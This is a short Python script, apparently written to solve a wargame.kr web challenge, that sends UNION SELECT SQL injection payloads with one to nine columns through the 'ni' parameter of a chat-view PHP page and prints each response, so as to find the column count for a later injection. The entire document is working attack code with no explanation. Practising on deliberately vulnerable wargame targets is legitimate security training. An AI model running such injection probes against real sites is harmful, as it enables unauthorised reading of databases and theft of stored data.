from requests import *
s=session()
query=''
for i in range(1,10):
    for j in range(1,i+1):
        if j==1:
            query+=f'{j}'
        else:
            query+=f',{j}'
    url=f'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=58880 union select {query}--'
    query=''
    print(url)
    response=get(url=url)
    print(response.text)